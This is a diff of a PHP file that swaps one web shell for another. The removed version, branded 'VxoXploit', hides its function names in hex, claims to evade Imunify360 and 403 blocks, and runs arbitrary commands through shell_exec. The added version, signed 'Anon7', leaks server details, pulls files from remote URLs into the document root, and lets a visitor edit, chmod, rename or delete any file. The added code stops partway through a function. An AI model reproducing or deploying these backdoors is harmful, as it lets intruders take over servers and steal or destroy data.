@@ -1,480 +1,439 @@
-<?php
-
-          /**
-            * Code By : https://github.com/Tituss22
-            * Fitur shell:
-            - Bypass 403 Forbidden
-            - Bypass All Server
-            - Bypass Imunify360
-            - Bypass Not Acceptable
-          **/
-
-$iniarray = 	[
-				"7068705F756E616D65",
-				"73657373696F6E5F7374617274",
-				"6572726F725F7265706F7274696E67",
-				"70687076657273696F6E",
-				"66696C655F7075745F636F6E74656E7473",
-				"66696C655F6765745F636F6E74656E7473",
-				"66696C657065726D73",
-				"66696C656D74696D65",
-				"66696C6574797065",
-				"68746D6C7370656369616C6368617273",
-				"737072696E7466",
-				"737562737472",
-				"676574637764",
-				"6368646972",
-				"7374725F7265706C616365",
-				"6578706C6F6465",
-				"666C617368",
-				"6D6F76655F75706C6F616465645F66696C65",
-				"7363616E646972",
-				"676574686F737462796E616D65",
-				"7368656C6C5F65786563",
-				"74727565",
-				"6469726E616D65",
-				"64617465",
-				"6D696D655F636F6E74656E745F74797065",
-				"66756E6374696F6E5F657869737473",
-				"6673697A65",
-				"726D646972",
-				"756E6C696E6B",
-				"6D6B646972",
-				"72656E616D65"
-		];
-
-for ($i = 0; $i < count($iniarray); $i++) {
-	$func[$i] =	hexa($iniarray[$i]);
-}
-
-$func[1]();
-$func[2](0);
-function fsize($file) {
-	$a = ["B", "KB", "MB", "GB", "TB", "PB"];
-	$pos = 0;
-	$size = filesize($file);
-	while ($size >= 1024) {
-		$size /= 1024;
-		$pos++;
-	}
-	return round($size, 2)." ".$a[$pos];
-}
-
-function hexa($str) {
-	$r = "";
-	$len = (strlen($str) - 1);
-	for ($i = 0; $i < $len; $i += 2) {
-		$r .= chr(hexdec($str[$i].$str[$i + 1]));
-	}
-	return $r;
-}
-
-function flash($message, $status, $class, $redirect = false) {
-	if (!empty($_SESSION["message"])) {
-		unset($_SESSION["message"]);
-	}
-	if (!empty($_SESSION["class"])) {
-		unset($_SESSION["class"]);
-	}
-	if (!empty($_SESSION["status"])) {
-		unset($_SESSION["status"]);
-	}
-	$_SESSION["message"] = $message;
-	$_SESSION["class"] = $class;
-	$_SESSION["status"] = $status;
-	if ($redirect) {
-		header('Location: ' . $redirect);
-		exit();
-	}
-	return $func[21];
-}
-
-function clear() {
-	if (!empty($_SESSION["message"])) {
-		unset($_SESSION["message"]);
-	}
-	if (!empty($_SESSION["class"])) {
-		unset($_SESSION["class"]);
-	}
-	if (!empty($_SESSION["status"])) {
-		unset($_SESSION["status"]);
-	}
-	return $func[21];
-}
-
-if (isset($_GET['dir'])) {
-	$path = $_GET['dir'];
-	$func[13]($_GET['dir']);
-} else {
-	$path = $func[12]();
-}
-
-$path = $func[14]('\\', '/', $path);
-$exdir = $func[15]('/', $path);
-
-
-if (isset($_POST['newFolderName'])) {
-	if ($func[29]($path . '/' . $_POST['newFolderName'])) {
-		$func[16]("Create Folder Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Create Folder Failed", "Failed", "error", "?dir=$path");
-	}
-}
-if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
-	if ($func[4]($_POST['newFileName'], $_POST['newFileContent'])) {
-		$func[16]("Create File Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Create File Failed", "Failed", "error", "?dir=$path");
-	}
-}
-
-if (isset($_POST['newName']) && isset($_GET['item'])) {
-	if ($_POST['newName'] == '') {
-		$func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
-	}
-	if ($func[30]($path. '/'. $_GET['item'], $_POST['newName'])) {
-		$func[16]("Rename Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Rename Failed", "Failed", "error", "?dir=$path");
-	}
-}
-if (isset($_POST['newContent']) && isset($_GET['item'])) {
-	if ($func[4]($path. '/'. $_GET['item'], $_POST['newContent'])) {
-		$func[16]("Edit Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Edit Failed", "Failed", "error", "?dir=$path");
-	}
-}
-if (isset($_POST['newPerm']) && isset($_GET['item'])) {
-	if ($_POST['newPerm'] == '') {
-		$func[16]("You miss an important value", "Ooopss..", "warning", "?dir=$path");
-	}
-	if (chmod($path. '/'. $_GET['item'], $_POST['newPerm'])) {
-		$func[16]("Change Permission Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Change Permission", "Failed", "error", "?dir=$path");
-	}
-}
-if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
-	if (is_dir($_GET['item'])) {
-		if ($func[27]($_GET['item'])) {
-			$func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
-		} else {
-			$func[16]("Delete Failed", "Failed", "error", "?dir=$path");
-		}
-	} else {
-		if ($func[28]($_GET['item'])) {
-			$func[16]("Delete Successfully!", "Success", "success", "?dir=$path");
-		} else {
-			$func[16]("Delete Failed", "Failed", "error", "?dir=$path");
-		}
-	}
-}
-if (isset($_FILES['uploadfile'])) {
-	if ($func[17]( $_FILES['uploadfile']['tmp_name'], $_FILES['uploadfile']['name'])) {
-		$func[16]("Upload Successfully!", "Success", "success", "?dir=$path");
-	} else {
-		$func[16]("Upload Failed", "Failed", "error", "?dir=$path");
-	}
-}
-$dirs = $func[18]($path);
-
-?>
+<!DOCTYPE html>
 <html>
 <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
-	<title> VxoXploit </title>
+	<title>.</title>
 </head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link href="" rel="stylesheet" type="text/css">
+<style>
+	@import url('https://fonts.googleapis.com/css?family=Dosis');
+	@import url('https://fonts.googleapis.com/css?family=Bungee');
+body {
+	font-family: "Dosis", cursive;
+	text-shadow:0px 0px 1px #757575;
+}
 
-<body class="bg-dark text-light">
-	<div class="container-fluid justify-content-center align-items-center">
-		<div class="py-3" id="main">
-			<div class="box shadow bg-dark p-4 rounded-3">
-				<div class="col-md-12">
-					<div class="table-responsive">
-						<table class="table table-sm table-dark">
-							<tr>
-								<td>Uname</td>
-								<td>: <?= $func[0]() ?></td>
-							</tr>
-							<tr>
-								<td>Software</td>
-								<td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
-							</tr>
-							<tr>
-								<td>PHP</td>
-								<td>: <?= $func[3](); ?></td>
-							</tr>
-							<tr>
-								<td>IP Server</td>
-								<td>: <?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?></td>
-							</tr>
-							<tr>
-								<td>Port</td>
-								<td>: <?= $_SERVER['SERVER_NAME'] ?>:<?= $_SERVER['SERVER_PORT'] ?></td>
-							</tr>
-							<tr>
-								<td>Mail</td>
-								<td>: <?= ($func[26]('mail')) ? 'ON' : 'OFF' ?></td>
-							</tr>
-						</table>
-					</div>
-				</div>
-				<div class="breadcrumb">
-					<i class="fa fa-home pt-1 me-1"></i> ~ <span class="mx-1"><?php foreach ($exdir as $id => $pat) : 
-						if ($pat == '' && $id == 0):
-					?>
-					<a href="?dir=/" class="text-decoration-none text-light">/</a>
-					<?php endif; if ($pat == '') continue; ?>
-					<?php if ($id + 1 == count($exdir)) : ?>
-					<span class="text-secondary"><?= $pat ?></span>
-					<?php else : ?>
-					<a href="?dir=
-					<?php
-					for ($i = 0; $i <= $id; $i++) {
-						echo "$exdir[$i]";
-						if ($i != $id) echo "/";
-					}
-					?>
-					" class="text-decoration-none text-light"><?= $pat ?></a><span class="text-light"> /</span>
-					<?php endif; ?>
-					<?php endforeach; ?></span>
-					<a href="?" class="text-light text-decoration-none mx-2">[ HOME ]</a>
-				</div>
-				<div class="d-flex justify-content-between">
-					<div class="p-2">
-						<form action="" method="post">
-							<div class="row">
-								<div class="col-md-9 mb-3">
-									<input type="text" class="form-control form-control-sm" name="command" placeholder="Command">
-								</div>
-								<div class="col-md-3">
-									<button type="submit" class="btn btn-outline-light btn-sm">Exec</button>
-								</div>
-							</div>
-						</form>
-					</div>
-					<div class="p-2">
-						<form action="" method="post" enctype="multipart/form-data">
-							<div class="row">
-								<div class="col-md-9 mb-3">
-									<input type="file" class="form-control form-control-sm" name="uploadfile" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
-								</div>
-								<div class="col-md-3">
-									<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
-								</div>
-							</div>
-						</form>
-					</div>
-				</div>
-				<div class="container" id="tools">
-					<?php if (isset($_POST['command'])) : ?>
-					<div class="row justify-content-center">
-						<pre><?= $func[20]($_POST['command']) ?></pre>
-					</div>
-					<?php endif; ?>
-					<?php if (isset($_GET['action']) && $_GET['action'] != 'delete') : $action = $_GET['action'] ?>
-					<div class="row justify-content-center">
-						<?php if ($action == 'rename' && isset($_GET['item'])) : ?>
-						<form action="" method="post">
-							<div class="mb-3">
-								<label for="name" class="form-label">New Name</label>
-								<input type="text" class="form-control" name="newName" value="<?= $_GET['item'] ?>">
-							</div>
-							<button type="submit" class="btn btn-outline-light">Submit</button>
-							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-						</form>
-						<?php elseif ($action == 'edit' && isset($_GET['item'])) : ?>
-						<form action="" method="post">
-							<div class="mb-3">
-								<label for="name" class="form-label"><?= $_GET['item'] ?></label>
-								<textarea name="newContent" rows="10" class="form-control"><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
-							</div>
-							<button type="submit" class="btn btn-outline-light">Submit</button>
-							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-						</form>
-						<?php elseif ($action == 'view' && isset($_GET['item'])) : ?>
-						<div class="mb-3">
-							<label for="name" class="form-label">File Name : <?= $_GET['item'] ?></label>
-							<textarea name="newContent" rows="10" class="form-control" disabled=""><?= $func[9]($func[5]($path. '/'. $_GET['item'])) ?></textarea>
-							<br>
-							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-						</div>
-						<?php elseif ($action == 'chmod' && isset($_GET['item'])) : ?>
-						<form action="" method="post">
-							<div class="mb-3">
-								<label for="name" class="form-label"><?= $_GET['item'] ?></label>
-								<input type="text" class="form-control" name="newPerm" value="<?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?>">
-							</div>
-							<button type="submit" class="btn btn-outline-light">Submit</button>
-							<button type="button" class="btn btn-outline-light" onclick="history.go(-1)">Back</button>
-						</form>
-						<?php endif; ?>
-					</div>
-					<?php endif; ?>
-					<div class="row justify-content-center">
-						<div class="collapse" id="newFolderCollapse" data-bs-parent="#tools" style="transition:none;">
-							<form action="" method="post">
-								<div class="mb-3">
-									<label for="name" class="form-label">Folder Name</label>
-									<input type="text" class="form-control" name="newFolderName" placeholder="folder">
-								</div>
-								<button type="submit" class="btn btn-outline-light">Submit</button>
-							</form>
-						</div>
-						<div class="collapse" id="newFileCollapse" data-bs-parent="#tools" style="transition:none;">
-							<form action="" method="post">
-								<div class="mb-3">
-									<label for="name" class="form-label">File Name</label>
-									<input type="text" class="form-control" name="newFileName" placeholder="index.php">
-								</div>
-								<div class="mb-3">
-									<label for="name" class="form-label">File Content</label>
-									<textarea name="newFileContent" rows="10" class="form-control" placeholder="Hello World"></textarea>
-								</div>
-								<button type="submit" class="btn btn-outline-light">Submit</button>
-							</form>
-						</div>
-						<div class="collapse" id="infoCollapse" data-bs-parent="#tools" style="transition:none;">
-							<div class="table-responsive">
-								<table class="table table-hover table-dark text-light">
-									<tr>
-										<td><i class="fa fa-folder-plus"> fa fa-folder-plus</i></td>
-										<td>: Add Folder</td>
-									</tr>
-									<tr>
-										<td><i class="fa fa-file-plus"> fa fa-file-plus</i></td>
-										<td>: Add File</td>
-									</tr>
-									<tr>
-										<td><i class="fa fa-file-edit"> fa fa-file-edit</i></td>
-										<td>: Edit File</td>
-									</tr>
-									<tr>
-										<td><i class="fa fa-edit"> fa fa-edit</i></td>
-										<td>: Rename</td>
-									</tr>
-									<tr>
-										<td><i class="fa fa-file-signature"> fa fa-file-signature</i></td>
-										<td>: Chmod</td>
-									</tr>
-									<tr>
-										<td><i class="fa fa-trash"> fa fa-trash</i></td>
-										<td>: Delete</td>
-									</tr>
-								</table>
-							</div>
-						</div>
-					</div>
-					
-				</div>
-				<div class="table-responsive">
-					<table class="table table-hover table-gray text-light">
-						<thead>
-							<tr>
-								<td style="width:35%">Name</td>
-								<td style="width:14%">Type</td>
-								<td style="width:14%">Size</td>
-								<td style="width:14%">Permission</td>
-								<td style="width:14%">Last Modified</td>
-								<td style="width:9%">Actions</td>
-							</tr>
-						</thead>
-						<tbody class="text-nowrap">
-							<?php
-								foreach ($dirs as $dir) :
-									if (!is_dir($dir)) continue;
-							?>
-							<tr>
-								<td>
-									<?php if ($dir === '..') : ?>
-									<a href="?dir=<?= $func[22]($path); ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
-									<?php elseif ($dir === '.') :  ?>
-									<a href="?dir=<?= $path; ?>" class="text-decoration-none text-light"><i class="fa fa-folder-open"></i> <?= $dir ?></a>
-									<?php else : ?>
-									<a href="?dir=<?= $path . '/' . $dir ?>" class="text-decoration-none text-light"><i class="fa fa-folder"></i> <?= $dir ?></a>
-									<?php endif; ?>
-								</td>
-								<td class="text-light"><?= $func[8]($dir) ?></td>
-								<td class="text-light">-</td>
-								<td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
-								<td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
-								<td>
-									<?php if ($dir != '.' && $dir != '..') : ?>
-									<div class="btn-group">
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
-										<a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
-									</div>
-									<?php elseif ($dir === '.') : ?>
-									<div class="btn-group" role="group" aria-label="Basic example">
-										<a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1">Buat Folder<i class="fa fa-folder-plus"></i></a>
-										<a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1">Buat File<i class="fa fa-file-plus"></i></a>
-										<a data-bs-toggle="collapse" href="#infoCollapse" role="button" aria-expanded="false" aria-controls="infoCollapse" class="btn btn-outline-light btn-sm mr-1">Info<i class="fa fa-info"></i></a>
-									</div>
-									<?php endif; ?>
-								</td>
-							</tr>
-							<?php endforeach; ?>
-							<?php
-								foreach ($dirs as $dir) :
-									if (!is_file($dir)) continue;
-							?>
-							<tr>
-								<td>
-									<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
-								</td>
-								<td class="text-light"><?= ($func[25]('mime_content_type') ? $func[24]($dir) : $func[8]($dir)) ?></td>
-								<td class="text-light"><?= $func[26]($dir) ?></td>
-								<td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
-								<td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
-								<td>
-									<?php if ($dir != '.' && $dir != '..') : ?>
-									<div class="btn-group" role="group" aria-label="Basic example">
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1">edit<i class="fa fa-file-edit"></i></a>
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1">rename<i class="fa fa-edit"></i></a>
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1">chmod<i class="fa fa-file-signature"></i></a>
-										<a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=delete" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')">hapus<i class="fa fa-trash"></i></a>
-									</div>
-									<?php endif; ?>
-								</td>
-							</tr>
-							<?php endforeach; ?>
-						</tbody>
-					</table>
-				</div>
-			</div>
-		</div>
-	</div>
-	<div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2022 - Code By VxoXploit</small></div>
-	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
-	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
-	<script>
-	<?php if (isset($_SESSION['message'])) : ?>
-				Swal.fire(
-					'<?= $_SESSION['status'] ?>',
-					'<?= $_SESSION['message'] ?>',
-					'<?= $_SESSION['class'] ?>'
-				)
-	<?php endif; clear(); ?>
-		function deleteConfirm(url) {
-			event.preventDefault()
-			Swal.fire({
-			  	title: 'Are you sure?',
-			  	icon: 'warning',
-			  	showCancelButton: true,
-			  	confirmButtonColor: '#3085d6',
-			  	cancelButtonColor: '#d33',
-			  	confirmButtonText: 'Yes, delete it!'
-			}).then((result) => {
-			  	if (result.isConfirmed) {
-			  		window.location.href = url
-			  }
-			})
+#content tr:hover {
+	background-color: #636263;
+	text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+	background-color: #25383C;
+}
+
+#content .first:hover {
+	background-color: #25383C
+	text-shadow:0px 0px 1px #757575;
+}
+
+table {
+	border: 1px #000000 dotted;
+	table-layout: fixed;
+}
+
+td {
+	word-wrap: break-word;
+}
+
+a {
+	color: #ffffff;
+	text-decoration: none;
+}
+
+a:hover {
+	color: #000000;
+	text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+	border: 1px #000000 solid;
+	-moz-border-radius: 5px;
+	-webkit-border-radius:5px;
+	border-radius:5px;
+}
+
+.gas {
+	background-color: #1f1f1f;
+	color: #ffffff;
+	cursor: pointer;
+}
+
+select {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+select:after {
+	cursor: pointer;
+}
+
+.linka {
+	background-color: transparent;
+	color: #ffffff;
+}
+
+.up {
+	background-color: transparent;
+	color: #fff;
+}
+
+option {
+	background-color: #1f1f1f;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
+<center>
+<font face="Bungee" size="5">KGRKJGETMRETU895U-589TY5MIGM5JGB5SDFESFREWTGR54TY</font></center>
+<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr><td>
+<?php
+set_time_limit(0);
+error_reporting(0);
+
+$disfunc = @ini_get("disable_functions");
+if (empty($disfunc)) {
+	$disf = "<font color='gold'>NONE</font>";
+} else {
+	$disf = "<font color='red'>".$disfunc."</font>";
+}
+
+function author() {
+	echo "<center><br>Anon7 - 2021</center>";
+	exit();
+}
+
+function cekdir() {
+	if (isset($_GET['path'])) {
+		$lokasi = $_GET['path'];
+	} else {
+		$lokasi = getcwd();
+	}
+	if (is_writable($lokasi)) {
+		return "<font color='green'>Writeable</font>";
+	} else {
+		return "<font color='red'>Writeable</font>";
+	}
+}
+
+function cekroot() {
+	if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
+		return "<font color='green'>Writeable</font>";
+	} else {
+		return "<font color='red'>Writeable</font>";
+	}
+}
+
+function xrmdir($dir) {
+    $items = scandir($dir);
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') {
+            continue;
+        }
+        $path = $dir.'/'.$item;
+        if (is_dir($path)) {
+            xrmdir($path);
+        } else {
+            unlink($path);
+        }
+    }
+    rmdir($dir);
+}
+
+function green($text) {
+	echo "<center><font color='green'>".$text."</center></font>";
+}
+
+function red($text) {
+	echo "<center><font color='red'>".$text."</center></font>";
+}
+
+echo "Server : <font color='gold'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
+echo "System : <font color='gold'>".php_uname()."</font><br>";
+echo "User : <font color='gold'>".@get_current_user()."&nbsp;</font>( <font color='gold'>".@getmyuid()."</font>)<br>";
+echo "PHP Version : <font color='gold'>".@phpversion()."</font><br>";
+echo "Disable Function : ".$disf."</font><br>";
+echo "Directory : &nbsp;";
+
+foreach($_POST as $key => $value){
+	$_POST[$key] = stripslashes($value);
+}
+
+if(isset($_GET['path'])){
+	$lokasi = $_GET['path'];
+	$lokdua = $_GET['path'];
+} else {
+	$lokasi = getcwd();
+	$lokdua = getcwd();
+}
+
+$lokasi = str_replace('\\','/',$lokasi);
+$lokasis = explode('/',$lokasi);
+$lokasinya = @scandir($lokasi);
+
+foreach($lokasis as $id => $lok){
+	if($lok == '' && $id == 0){
+		$a = true;
+		echo '<a href="?path=/">/</a>';
+		continue;
+	}
+	if($lok == '') continue;
+	echo '<a href="?path=';
+	for($i=0;$i<=$id;$i++){
+	echo "$lokasis[$i]";
+	if($i != $id) echo "/";
+} 
+echo '">'.$lok.'</a>/';
+}
+
+echo '</td></tr><tr><td><br>';
+if (isset($_POST['upwkwk'])) {
+	if (isset($_POST['berkasnya'])) {
+		if ($_POST['dirnya'] == "2") {
+			$lokasi = $_SERVER['DOCUMENT_ROOT'];
 		}
-	</script>
-</body>
-</html>
+		$data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
+		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
+			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
+		} else {
+			echo "<font color='red'>Failed to Upload !<br><br>";
+		}
+	} elseif (isset($_POST['linknya'])) {
+		if (empty($_POST['namalink'])) {
+			exit("Filename cannot be empty !");
+		}
+		if ($_POST['dirnya'] == "2") {
+			$lokasi = $_SERVER['DOCUMENT_ROOT'];
+		}
+		$data = @file_put_contents($lokasi."/".$_POST['namalink'], @file_get_contents($_POST['darilink']));
+		if (file_exists($lokasi."/".$_POST['namalink'])) {
+			echo "File Uploaded ! &nbsp;<font color='gold'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
+		} else {
+			echo "<font coloe='red'>Failed to Upload !<br><br>";
+		}
+	}
+}
+
+echo "Upload File : ";
+echo '<form enctype="multipart/form-data" method="post">
+<input type="radio" value="1" name="dirnya" checked>current_dir [ '.cekdir().' ]
+<input type="radio" value="2" name="dirnya" >document_root [ '.cekroot().' ]
+<br>
+<input type="hidden" name="upwkwk" value="aplod">
+<input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
+<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+</form>';
+echo "</table><br>";
+
+if (isset($_GET['fileloc'])) {
+	echo "<tr><td>Current File : ".$_GET['fileloc'];
+	echo '</tr></td></table><br/>';
+	echo "<pre>".htmlspecialchars(file_get_contents($_GET['fileloc']))."</pre>";
+	author();
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "hapus") {
+	if (is_dir($_POST['path'])) {
+		xrmdir($_POST['path']);
+		if (file_exists($_POST['path'])) {
+			red("Failed to delete Directory !");
+		} else {
+			green("Delete Directory Success !");
+			echo "string";
+		}
+	} elseif (is_file($_POST['path'])) {
+		@unlink($_POST['path']);
+		if (file_exists($_POST['path'])) {
+			red("Failed to Delete File !");
+		} else {
+			green("Delete File Success !");
+		}
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
+	echo "<center>".$_POST['path']."<br>";
+	echo '<form method="post">
+	Permission : <input name="perm" type="text" class="up" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
+	<input type="hidden" name="path" value="'.$_POST['path'].'">
+	<input type="hidden" name="pilih" value="ubahmod">
+	<input type="submit" value="Change" name="chm0d" class="up" style="cursor: pointer; border-color: #fff"/>
+	</form>';
+	if (isset($_POST['chm0d'])) {
+		$cm = @chmod($_POST['path'], $_POST['perm']);
+		if ($cm == true) {
+			green("Change Mod Success !");
+		} else {
+			red("Change Mod Failed !");
+		}
+	}
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "gantinama") {
+	if (isset($_POST['gantin'])) {
+		$ren = @rename($_POST['path'], $_POST['newname']);
+		if ($ren == true) {
+			green("Change Name Success !");
+		} else {
+			red("Change Name Failed !");
+		}
+	}
+	if (empty($_POST['name'])) {
+		$namaawal = $_POST['newname'];
+	} else {
+		$namawal = $_POST['name'];
+	}
+	echo "<center>".$_POST['path']."<br>";
+	echo '<form method="post">
+	New Name : <input name="newname" type="text" class="up" size="20" value="'.$namaawal.'" />
+	<input type="hidden" name="path" value="'.$_POST['path'].'">
+	<input type="hidden" name="pilih" value="gantinama">
+	<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
+	</form>';
+} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
+	if (isset($_POST['gasedit'])) {
+		$edit = @file_put_contents($_POST['path'], $_POST['src']);
+		if ($edit == true) {
+			green("Edit File Success !");
+		} else {
+			red("Edit File Failed !");
+		}
+	}
+	echo "<center>".$_POST['path']."<br><br>";
+	echo '<form method="post">
+	<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br>
+	<input type="hidden" name="path" value="'.$_POST['path'].'">
+	<input type="hidden" name="pilih" value="edit">
+	<input type="submit" value="Edit File" name="gasedit" />
+	</form><br>';
+}
+
+echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<tr class="first">
+<td><center>Name</center></td>
+<td><center>Size</center></td>
+<td><center>Permissions</center></td>
+<td><center>Options</center></td>
+</tr>';
+
+foreach($lokasinya as $dir){
+	if(!is_dir($lokasi."/".$dir) || $dir == '.' || $dir == '..') continue;
+	echo "<tr>
+	<td><a href=\"?path=".$lokasi."/".$dir."\">".$dir."</a></td>
+	<td><center>--</center></td>
+	<td><center>";
+	if(is_writable($lokasi."/".$dir)) echo '<font color="green">';
+	elseif(!is_readable($lokasi."/".$dir)) echo '<font color="red">';
+	echo statusnya($lokasi."/".$dir);
+	if(is_writable($lokasi."/".$dir) || !is_readable($lokasi."/".$dir)) echo '</font>';
+
+	echo "</center></td>
+	<td><center><form method=\"POST\" action=\"?pilihan&path=$lokasi\">
+	<select name=\"pilih\">
+	<option value=\"\"></option>
+	<option value=\"hapus\">Delete</option>
+	<option value=\"ubahmod\">Chm0d</option>
+	<option value=\"gantinama\">Rename</option>
+	</select>
+	<input type=\"hidden\" name=\"type\" value=\"dir\">
+	<input type=\"hidden\" name=\"name\" value=\"$dir\">
+	<input type=\"hidden\" name=\"path\" value=\"$lokasi/$dir\">
+	<input type=\"submit\" class=\"gas\" value=\">\" />
+	</form></center></td>
+	</tr>";
+}
+
+echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
+foreach($lokasinya as $file) {
+	if(!is_file("$lokasi/$file")) continue;
+	$size = filesize("$lokasi/$file")/1024;
+	$size = round($size,3);
+	if($size >= 1024){
+	$size = round($size/1024,2).' MB';
+} else {
+	$size = $size.' KB';
+}
+
+echo "<tr>
+<td><a href=\"?fileloc=$lokasi/$file&path=$lokasi\">$file</a></td>
+<td><center>".$size."</center></td>
+<td><center>";
+if(is_writable("$lokasi/$file")) echo '<font color="green">';
+elseif(!is_readable("$lokasi/$file")) echo '<font color="red">';
+echo statusnya("$lokasi/$file");
+if(is_writable("$lokasi/$file") || !is_readable("$lokasi/$file")) echo '</font>';
+echo "</center></td><td><center>
+<form method=\"post\" action=\"?pilihan&path=$lokasi\">
+<select name=\"pilih\">
+<option value=\"\"></option>
+<option value=\"hapus\">Delete</option>
+<option value=\"ubahmod\">Chm0d</option>
+<option value=\"gantinama\">Rename</option>
+<option value=\"edit\">Edit</option>
+</select>
+<input type=\"hidden\" name=\"type\" value=\"file\">
+<input type=\"hidden\" name=\"name\" value=\"$file\">
+<input type=\"hidden\" name=\"path\" value=\"$lokasi/$file\">
+<input type=\"submit\" class=\"gas\" value=\">\" />
+</form></center></td>
+</tr>";
+}
+echo '</tr></td></table></table>';
+author();
+
+function statusnya($file){
+$statusnya = fileperms($file);
+
+if (($statusnya & 0xC000) == 0xC000) {
+
+// Socket
+$ingfo = 's';
+} elseif (($statusnya & 0xA000) == 0xA000) {
+// Symbolic Link
+$ingfo = 'l';
+} elseif (($statusnya & 0x8000) == 0x8000) {
+// Regular
+$ingfo = '-';
+} elseif (($statusnya & 0x6000) == 0x6000) {
+// Block special
+$ingfo = 'b';
+} elseif (($statusnya & 0x4000) == 0x4000) {
+// Directory
+$ingfo = 'd';
